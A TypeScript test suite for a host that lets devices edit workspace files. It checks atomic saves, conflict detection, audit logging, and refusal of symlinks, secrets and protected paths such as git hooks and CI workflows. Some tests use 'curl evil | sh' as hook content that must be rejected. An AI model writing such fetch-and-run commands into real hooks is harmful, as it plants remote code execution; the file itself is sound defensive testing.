import { createHash, randomUUID } from 'node:crypto'
import { chmod, mkdir, mkdtemp, readFile, readdir, realpath, rm, stat, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, onTestFinished, vi } from 'vitest'
import { splitChangeNote, type ChangeList, type FileEditResult, type FileMetadata, type TurnChanges } from '@latch/protocol'
import { FAKE_ACP_AGENT, type TestDevice } from '@latch/testkit'
import { AuditLog } from '../src/audit.ts'
import { mixedLineEndings, shapeContent, textShape } from '../src/files/edit.ts'
import { editProtection } from '../src/files/index.ts'
import type { Device } from '@latch/protocol'
import { startTestHost, type TestHost, type TestHostOptions } from './helpers/host.ts'

const hosts: TestHost[] = []
afterEach(async () => {
  vi.restoreAllMocks()
  for (const host of hosts.splice(0)) await host.close()
})

const SLOW = { timeout: 15_000 }
const sha = (bytes: string | Uint8Array) => createHash('sha256').update(bytes).digest('hex')

/** A Host with the fake agent and one settled turn, so the session has folders, a turn on record and an agent to tell. */
async function fixture(options: TestHostOptions = {}) {
  const t = await startTestHost(options)
  hosts.push(t)
  const owner = await t.enroll({ listener: 'unix' })
  const agentLog = join(t.root, 'agent.log')
  const saved = await owner.confirmed('agents', {
    method: 'POST',
    body: { id: 'fake', name: 'Fake', command: process.execPath, args: [FAKE_ACP_AGENT], env: { FAKE_ACP_LOG: agentLog } },
  })
  expect(saved.status).toBe(201)
  const created = await owner.confirmed('tasks', {
    method: 'POST',
    body: { prompt: 'shell-edit', requestId: randomUUID(), mode: 'agent', harnessId: 'fake', workspaceId: 'default' },
  })
  expect(created.status).toBe(201)
  const { sessionId } = (await created.json()) as { sessionId: string }
  const turns = async () => (await owner.json<{ turns: TurnChanges[] }>(`tasks/${sessionId}/changes/turns`)).turns
  await expect.poll(async () => (await turns()).at(-1)?.state, SLOW).toBe('settled')
  await expect.poll(async () => (await t.host.bridge.summary(sessionId)).status, SLOW).toBe('idle')
  const file = (name: string) => join(t.workspaceRoot, name)
  const open = async (device: TestDevice, name: string) => {
    const { files } = await device.json<{ files: Array<{ status: string; file?: FileMetadata }> }>(`tasks/${sessionId}/files/resolve`, {
      method: 'POST',
      body: { paths: [name] },
    })
    return files[0]!.file!
  }
  const save = (device: TestDevice, handle: string, body: { requestId?: string; baseHash: string; content: string }) =>
    device.request(`tasks/${sessionId}/files/${handle}`, { method: 'PUT', body: { requestId: randomUUID(), ...body } })
  return { t, owner, sessionId, file, open, save, agentLog }
}

async function audited(t: TestHost): Promise<string[]> {
  const log = await readFile(join(t.dataDir, 'audit', 'audit.jsonl'), 'utf8')
  return log
    .trim()
    .split('\n')
    .map(line => (JSON.parse(line) as { action: string }).action)
    .filter(action => action === 'file.edit' || action === 'action.failed')
}

const errorOf = async (response: Response) => {
  const body = (await response.json()) as { error: string; currentHash?: string }
  return { status: response.status, error: body.error, ...(body.currentHash ? { currentHash: body.currentHash } : {}) }
}

describe('text shape', () => {
  it("keeps the file's line endings, final newline and byte-order mark", () => {
    const crlf = textShape(Buffer.from('a\r\nb\r\n'))!
    expect(crlf).toEqual({ mixed: false, bom: false, eol: '\r\n', finalNewline: true })
    expect(textShape(Buffer.from('a\r\nb\nc'))!.mixed).toBe(true)
    expect(mixedLineEndings(Buffer.from('a\rb\n'))).toBe(true)
    expect(mixedLineEndings(Buffer.from('a\r\nb\r\n'))).toBe(false)
    // A prefix that ends between CR and LF is not taken for a lone CR.
    expect(mixedLineEndings(Buffer.from('a\nb\r'))).toBe(false)
    expect(shapeContent('a\nb\nc', crlf).toString()).toBe('a\r\nb\r\nc\r\n')
    const bare = textShape(Buffer.from('a\nb'))!
    expect(shapeContent('a\nb\nc\n', bare).toString()).toBe('a\nb\nc')
    const bom = textShape(Buffer.from('﻿hi\n'))!
    expect(bom.bom).toBe(true)
    expect([...shapeContent('hello', bom)].slice(0, 3)).toEqual([0xef, 0xbb, 0xbf])
    expect(shapeContent('', bare).length).toBe(0)
    expect(textShape(Buffer.from([0xff, 0xfe, 0x00]))).toBeUndefined()
    expect(textShape(Buffer.from('a\u0000b'))).toBeUndefined()
  })
})

describe('edit protection', () => {
  const device = (scopes: Device['scopes']) => ({ scopes }) as Device
  const root = { id: 'default', path: '/work/app' }
  const at = (relativePath: string) => ({ relativePath, realPath: `/work/app/${relativePath}` })
  it('never edits in the program folder, and asks R2 rights for protected paths', () => {
    const elevated = device(['view', 'run', 'approve:elevated'])
    expect(editProtection(elevated, at('a.txt'), root, '/work/app')).toEqual({ refusal: 'file-code-root' })
    expect(editProtection(elevated, at('a.txt'), root, '/work')).toEqual({ refusal: 'file-code-root' })
    expect(editProtection(elevated, at('a.txt'), root, '/work/app/vendor/latch')).toEqual({ refusal: 'file-code-root' })
    expect(editProtection(elevated, at('a.txt'), root, '/opt/latch')).toEqual({ protection: 'none' })
    expect(editProtection(device(['view', 'run']), at('package.json'), root, '/opt/latch')).toEqual({ refusal: 'file-edit-elevated' })
    expect(editProtection(elevated, at('package.json'), root, '/opt/latch')).toEqual({ protection: 'protected-path' })
  })
})

describe('file edits', () => {
  it('saves over the version opened, atomically, keeping the mode and line endings, with the audit first and a receipt', async () => {
    const { t, owner, file, open, save } = await fixture()
    await writeFile(file('notes.txt'), 'one\r\ntwo\r\n')
    await chmod(file('notes.txt'), 0o640)
    const before = await stat(file('notes.txt'))
    const opened = await open(owner, 'notes.txt')
    expect(opened.actions.edit).toBe(true)
    const requestId = randomUUID()
    const body = { requestId, baseHash: sha('one\r\ntwo\r\n'), content: 'one\ntwo\nthree' }
    const response = await save(owner, opened.handle, body)
    expect(response.status).toBe(200)
    const result = (await response.json()) as FileEditResult
    expect(await readFile(file('notes.txt'), 'utf8')).toBe('one\r\ntwo\r\nthree\r\n')
    expect(result).toMatchObject({ requestId, hash: sha('one\r\ntwo\r\nthree\r\n'), size: 17, noteNextTurn: true })
    const after = await stat(file('notes.txt'))
    expect(after.mode & 0o777).toBe(0o640)
    // A new file took the name: a reader never sees half of it.
    expect(after.ino).not.toBe(before.ino)
    expect((await readdir(t.workspaceRoot)).filter(name => name.endsWith('.tmp'))).toEqual([])
    expect(await audited(t)).toEqual(['file.edit'])

    // A retry of the same request answers the same; another body under the same ID is refused.
    const replay = (await (await save(owner, opened.handle, body)).json()) as FileEditResult
    expect(replay).toEqual({ ...result, replay: true })
    expect(await errorOf(await save(owner, opened.handle, { ...body, content: 'other' }))).toEqual({
      status: 409,
      error: 'request-id-reused',
    })
    // The same text again writes nothing.
    const same = (await (
      await save(owner, opened.handle, { baseHash: result.hash, content: 'one\ntwo\nthree\n' })
    ).json()) as FileEditResult
    expect(same).toMatchObject({ unchanged: true, hash: result.hash, noteNextTurn: false })
    expect(await audited(t)).toEqual(['file.edit'])
  })

  it('never overwrites a file changed since it was opened, before or during the write', async () => {
    let during: (() => Promise<void>) | undefined
    const { t, owner, file, open, save } = await fixture({ fileEditHooks: { beforeRename: async () => during?.() } })
    await writeFile(file('notes.txt'), 'mine\n')
    const opened = await open(owner, 'notes.txt')
    await writeFile(file('notes.txt'), 'theirs\n')
    expect(await errorOf(await save(owner, opened.handle, { baseHash: sha('mine\n'), content: 'edited' }))).toEqual({
      status: 409,
      error: 'file-changed',
      currentHash: sha('theirs\n'),
    })
    expect(await readFile(file('notes.txt'), 'utf8')).toBe('theirs\n')
    expect(await audited(t)).toEqual([])

    // Another program writes between the check and the rename: the edit is refused, theirs stays.
    during = () => writeFile(file('notes.txt'), 'late\n')
    expect(await errorOf(await save(owner, opened.handle, { baseHash: sha('theirs\n'), content: 'edited' }))).toEqual({
      status: 409,
      error: 'file-changed',
      currentHash: sha('late\n'),
    })
    expect(await readFile(file('notes.txt'), 'utf8')).toBe('late\n')
    expect((await readdir(t.workspaceRoot)).filter(name => name.endsWith('.tmp'))).toEqual([])
    expect(await audited(t)).toEqual(['file.edit', 'action.failed'])
  })

  it('writes nothing when the audit record cannot be written', async () => {
    const { t, owner, file, open, save } = await fixture()
    await writeFile(file('notes.txt'), 'mine\n')
    const opened = await open(owner, 'notes.txt')
    const append = AuditLog.prototype.append
    vi.spyOn(AuditLog.prototype, 'append').mockImplementation(function (this: AuditLog, event) {
      if (event.action === 'file.edit') return Promise.reject(new Error('disk full'))
      return append.call(this, event)
    })
    expect((await save(owner, opened.handle, { baseHash: sha('mine\n'), content: 'edited' })).status).toBe(500)
    expect(await readFile(file('notes.txt'), 'utf8')).toBe('mine\n')
    expect(await audited(t)).toEqual([])
  })

  it('refuses a path that became a link, leads outside the folders or into protected data, and files that are not text', async () => {
    const { t, owner, file, open, save } = await fixture()
    await writeFile(file('notes.txt'), 'mine\n')
    await writeFile(file('other.txt'), 'other\n')
    const opened = await open(owner, 'notes.txt')
    const base = sha('mine\n')
    await rm(file('notes.txt'))
    await symlink(file('other.txt'), file('notes.txt'))
    expect(await errorOf(await save(owner, opened.handle, { baseHash: base, content: 'x' }))).toEqual({
      status: 409,
      error: 'file-not-regular',
    })
    await rm(file('notes.txt'))
    const outside = join(t.root, 'outside.txt')
    await writeFile(outside, 'mine\n')
    await symlink(outside, file('notes.txt'))
    expect(await errorOf(await save(owner, opened.handle, { baseHash: base, content: 'x' }))).toEqual({
      status: 403,
      error: 'file-outside-folders',
    })
    expect(await readFile(outside, 'utf8')).toBe('mine\n')
    expect(await readFile(file('other.txt'), 'utf8')).toBe('other\n')

    await writeFile(file('.env'), 'TOKEN=abc\n')
    const secret = await open(owner, '.env')
    expect(secret.actions.edit).toBe(false)
    expect(await errorOf(await save(owner, secret.handle, { baseHash: sha('TOKEN=abc\n'), content: 'x' }))).toEqual({
      status: 403,
      error: 'file-secret',
    })
    await writeFile(file('latin.txt'), Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a]))
    const latin = await open(owner, 'latin.txt')
    expect(
      await errorOf(await save(owner, latin.handle, { baseHash: sha(Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a])), content: 'x' })),
    ).toEqual({
      status: 409,
      error: 'file-not-text',
    })
    await writeFile(file('big.txt'), 'x'.repeat(1024 * 1024 + 1))
    expect((await open(owner, 'big.txt')).actions.edit).toBe(false)
    expect(await audited(t)).toEqual([])
  })

  it("refuses Latch's private data inside a folder", async () => {
    const base = await realpath(await mkdtemp(join(tmpdir(), 'latch-edit-')))
    onTestFinished(() => rm(base, { recursive: true, force: true }))
    const workspaceRoot = join(base, 'project')
    await mkdir(workspaceRoot, { recursive: true })
    const { owner, file, open, save } = await fixture({ workspaceRoot, dataDir: join(workspaceRoot, 'data') })
    await writeFile(file('notes.txt'), 'mine\n')
    const opened = await open(owner, 'notes.txt')
    await rm(file('notes.txt'))
    await symlink(join(workspaceRoot, 'data', 'audit', 'audit.jsonl'), file('notes.txt'))
    expect(await errorOf(await save(owner, opened.handle, { baseHash: sha('mine\n'), content: 'x' }))).toEqual({
      status: 403,
      error: 'file-protected',
    })
  })

  it('refuses while a turn runs in the folder, and a device without run or the whole data scope', async () => {
    const { t, owner, sessionId, file, open, save } = await fixture()
    await writeFile(file('notes.txt'), 'mine\n')
    const base = sha('mine\n')
    const remote = await t.enroll({ listener: 'loopback-tcp', scopes: ['view', 'run'] })
    await t.host.security.devices.setScopes(remote.id, { dataScope: 'all' }, { listener: 'unix' }, 'lpc-local')
    const opened = await open(remote, 'notes.txt')
    expect(opened.actions.edit).toBe(true)

    const viewer = await t.enroll({ listener: 'loopback-tcp', scopes: ['view'] })
    await t.host.security.devices.setScopes(viewer.id, { dataScope: 'all' }, { listener: 'unix' }, 'lpc-local')
    const seen = await open(viewer, 'notes.txt')
    expect(seen.actions.edit).toBe(false)
    // The page says why 编辑 is not offered instead of leaving it out.
    expect(seen.refused?.edit).toBe('file-edit-scope')
    expect(await errorOf(await save(viewer, seen.handle, { baseHash: base, content: 'x' }))).toEqual({
      status: 403,
      error: 'scope-required',
    })

    // A device limited to what the session mentioned may read the file, never write it.
    await t.host.security.devices.setScopes(remote.id, { dataScope: 'work' }, { listener: 'unix' }, 'lpc-local')
    expect(await errorOf(await save(remote, opened.handle, { baseHash: base, content: 'x' }))).toEqual({ status: 403, error: 'file-scope' })
    await t.host.security.devices.setScopes(remote.id, { dataScope: 'all' }, { listener: 'unix' }, 'lpc-local')

    // A handle answers for its own session only.
    expect(
      await errorOf(
        await remote.request(`tasks/other-session/files/${opened.handle}`, {
          method: 'PUT',
          body: { requestId: randomUUID(), baseHash: base, content: 'x' },
        }),
      ),
    ).toMatchObject({ status: 404 })

    await owner.json(`tasks/${sessionId}/prompt`, { method: 'POST', body: { prompt: 'permission', requestId: randomUUID() } })
    await expect.poll(async () => (await t.host.bridge.summary(sessionId)).status, SLOW).toBe('waiting-approval')
    expect(await errorOf(await save(remote, opened.handle, { baseHash: base, content: 'x' }))).toEqual({
      status: 409,
      error: 'file-turn-running',
    })
    expect(await readFile(file('notes.txt'), 'utf8')).toBe('mine\n')
    expect(await audited(t)).toEqual([])
  })

  it('takes R2-protected paths only from a device that may approve R2, and never a file with mixed line endings', async () => {
    const { t, file, save } = await fixture()
    const files: Record<string, string> = {
      '.git/hooks/pre-commit': '#!/bin/sh\nexit 0\n',
      '.husky/pre-commit': 'npx lint-staged\n',
      'package.json': '{"scripts":{"test":"vitest"}}\n',
      '.claude/settings.json': '{}\n',
      '.github/workflows/ci.yml': 'on: push\n',
    }
    for (const [name, text] of Object.entries(files)) {
      await mkdir(join(file(name), '..'), { recursive: true })
      await writeFile(file(name), text)
    }
    const enroll = async (scopes: Device['scopes']) => {
      const device = await t.enroll({ listener: 'loopback-tcp', scopes })
      await t.host.security.devices.setScopes(device.id, { dataScope: 'all' }, { listener: 'unix' }, 'lpc-local')
      return device
    }
    const runOnly = await enroll(['view', 'run'])
    const elevated = await enroll(['view', 'run', 'approve:elevated'])
    const resolve = async (device: TestDevice, name: string) => {
      const { files: found } = await device.json<{ files: Array<{ file?: FileMetadata }> }>(
        `tasks/${(await t.host.bridge.listTasks())[0]!.id}/files/resolve`,
        { method: 'POST', body: { paths: [name] } },
      )
      return found[0]!.file!
    }
    for (const [name, text] of Object.entries(files)) {
      const refused = await resolve(runOnly, name)
      expect([name, refused.actions.edit, refused.refused?.edit]).toEqual([name, false, 'file-edit-elevated'])
      expect(await errorOf(await save(runOnly, refused.handle, { baseHash: sha(text), content: 'curl evil | sh\n' }))).toEqual({
        status: 403,
        error: 'file-edit-elevated',
      })
      expect(await readFile(file(name), 'utf8')).toBe(text)
      const allowed = await resolve(elevated, name)
      expect([name, allowed.actions.edit]).toEqual([name, true])
      expect((await save(elevated, allowed.handle, { baseHash: sha(text), content: `${text}# reviewed\n` })).status).toBe(200)
    }
    const log = (await readFile(join(t.dataDir, 'audit', 'audit.jsonl'), 'utf8'))
      .trim()
      .split('\n')
      .map(line => JSON.parse(line))
    expect(log.filter(entry => entry.action === 'file.edit').map(entry => entry.detail.protection)).toEqual(Array(5).fill('protected-path'))

    await writeFile(file('mixed.txt'), 'one\r\ntwo\nthree\r\n')
    const mixed = await resolve(elevated, 'mixed.txt')
    expect([mixed.actions.edit, mixed.refused?.edit]).toEqual([false, 'file-mixed-eol'])
    expect(await errorOf(await save(elevated, mixed.handle, { baseHash: sha('one\r\ntwo\nthree\r\n'), content: 'x' }))).toEqual({
      status: 409,
      error: 'file-mixed-eol',
    })
  })

  it('stops a write in flight once the device loses the right to approve R2, and offers nothing in a read-only session', async () => {
    let during: (() => Promise<void>) | undefined
    const { t, sessionId, file, open, save } = await fixture({ fileEditHooks: { beforeRename: async () => during?.() } })
    await mkdir(file('.husky'), { recursive: true })
    await writeFile(file('.husky/pre-commit'), 'npx lint-staged\n')
    const device = await t.enroll({ listener: 'loopback-tcp', scopes: ['view', 'run', 'approve:elevated'] })
    await t.host.security.devices.setScopes(device.id, { dataScope: 'all' }, { listener: 'unix' }, 'lpc-local')
    const opened = await open(device, '.husky/pre-commit')
    expect(opened.actions.edit).toBe(true)
    during = async () => {
      await t.host.security.devices.setScopes(device.id, { scopes: ['view', 'run'] }, { listener: 'unix' }, 'lpc-local')
    }
    expect(await errorOf(await save(device, opened.handle, { baseHash: sha('npx lint-staged\n'), content: 'curl evil | sh\n' }))).toEqual({
      status: 403,
      error: 'scope-required',
    })
    expect(await readFile(file('.husky/pre-commit'), 'utf8')).toBe('npx lint-staged\n')
    expect(await audited(t)).toEqual(['file.edit', 'action.failed'])
    expect((await readdir(file('.husky'))).filter(name => name.endsWith('.tmp'))).toEqual([])

    await writeFile(file('notes.txt'), 'mine\n')
    vi.spyOn(t.host.bridge, 'personalOf').mockImplementation(id => (id === sessionId ? ({ kind: 'assistant' } as never) : undefined))
    const owner = await t.enroll({ listener: 'unix' })
    const readOnly = await open(owner, 'notes.txt')
    expect(readOnly.actions.edit).toBe(false)
    expect((await save(owner, readOnly.handle, { baseHash: sha('mine\n'), content: 'x' })).status).toBe(409)
    expect(await readFile(file('notes.txt'), 'utf8')).toBe('mine\n')
  })

  it("marks the person's edit in the session's changes and tells the Agent's next turn", async () => {
    const { t, owner, sessionId, file, open, save, agentLog } = await fixture()
    const opened = await open(owner, 'agent-edit.txt')
    const text = await readFile(file('agent-edit.txt'), 'utf8')
    const saved = await save(owner, opened.handle, { baseHash: sha(text), content: `${text}by the person` })
    expect([saved.status, await saved.text()]).toEqual([200, expect.any(String)])

    const session = await owner.json<ChangeList>(`tasks/${sessionId}/changes?scope=session`)
    const edited = session.files.find(item => item.path === 'agent-edit.txt')
    expect(edited).toMatchObject({ byUser: true, byPerson: true })
    // A later outside write is no longer the person's.
    await writeFile(file('command-edit.txt'), 'outside\n')
    const outside = (await owner.json<ChangeList>(`tasks/${sessionId}/changes?scope=session`)).files.find(
      item => item.path === 'command-edit.txt',
    )
    expect(outside?.byPerson).toBeUndefined()

    const opener = async () => (await t.host.bridge.detail(sessionId)).messages.findLast(message => message.role === 'user')?.text ?? ''
    await owner.json(`tasks/${sessionId}/prompt`, { method: 'POST', body: { prompt: 'echo hello', requestId: randomUUID() } })
    await expect.poll(opener, SLOW).toContain('echo hello')
    const { note, text: written } = splitChangeNote(await opener())
    expect(written).toBe('echo hello')
    expect(note).toContain('用户编辑了 agent-edit.txt')
    await expect.poll(() => readFile(agentLog, 'utf8').catch(() => ''), SLOW).toContain('用户编辑了 agent-edit.txt')

    // Told once.
    await expect.poll(async () => (await t.host.bridge.summary(sessionId)).status, SLOW).toBe('idle')
    await owner.json(`tasks/${sessionId}/prompt`, { method: 'POST', body: { prompt: 'echo again', requestId: randomUUID() } })
    await expect.poll(opener, SLOW).toBe('echo again')
  })
})
